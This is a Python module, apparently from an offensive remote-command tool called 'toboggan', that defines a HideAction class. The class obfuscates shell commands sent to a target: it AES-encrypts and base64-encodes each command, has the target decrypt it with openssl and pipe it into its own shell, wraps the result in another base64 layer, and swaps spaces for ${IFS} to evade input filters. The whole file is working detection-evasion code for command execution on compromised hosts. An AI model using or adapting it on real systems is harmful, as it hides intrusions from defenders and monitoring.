# Built-in imports
import base64
import re
import os

# Third party library imports
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

# Local application/library specific imports
from toboggan.core.action import BaseAction
from toboggan.core import utils


def generate_key_iv():
    """
    Generates a random 32-byte key and a 16-byte IV for AES-256-CBC.
    Returns (key, iv) as hex-encoded strings (for OpenSSL compatibility).
    """
    key = os.urandom(32)  # 256-bit AES key
    iv = os.urandom(16)  # 128-bit IV
    return key.hex(), iv.hex()  # Return hex-encoded key & IV


def encrypt_command(command: str, key_hex: str, iv_hex: str) -> str:
    """
    Encrypts a command using AES-256-CBC for OpenSSL compatibility.

    Args:
        command (str): Command to encrypt.
        key_hex (str): Hex-encoded encryption key.
        iv_hex (str): Hex-encoded IV.

    Returns:
        str: Base64-encoded ciphertext (for easier handling).
    """
    key = bytes.fromhex(key_hex)
    iv = bytes.fromhex(iv_hex)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_bytes = cipher.encrypt(pad(command.encode(), AES.block_size))

    return base64.b64encode(encrypted_bytes).decode()


class HideAction(BaseAction):

    def __init__(self, executor):
        super().__init__(executor)

        self._AES_KEY, self._AES_IV = generate_key_iv()

        self._shell_path = "$(ps -p $$ -o comm=)"

    def run(self, command: str) -> str:
        # Verify if the user tries to control the redirection
        if re.search(r"(1?>>?|2?>>?|>>?|[0-9]+>&[0-9]+)", command) is None:
            command += " 2>&1"

        openssl_decrypt_cmd = (
            f"echo '{encrypt_command(command, self._AES_KEY, self._AES_IV)}'|base64 -d|"
            f"$(command -v openssl) enc -aes-256-cbc -d -K {self._AES_KEY} -iv {self._AES_IV}|{self._shell_path}"
        )

        obfuscated_command = base64.urlsafe_b64encode(
            f"{openssl_decrypt_cmd}|gzip|base64 -w0|rev".encode(encoding="utf-8")
        ).decode(encoding="utf-8")

        obfuscated_command = f"echo '{obfuscated_command}'|base64 -d|{self._shell_path}"

        # Replacing all the spaces with ${IFS} value, to evade most of the spaces control.
        obfuscated_command = obfuscated_command.replace(" ", "${IFS}")

        # Our command is ready
        return obfuscated_command
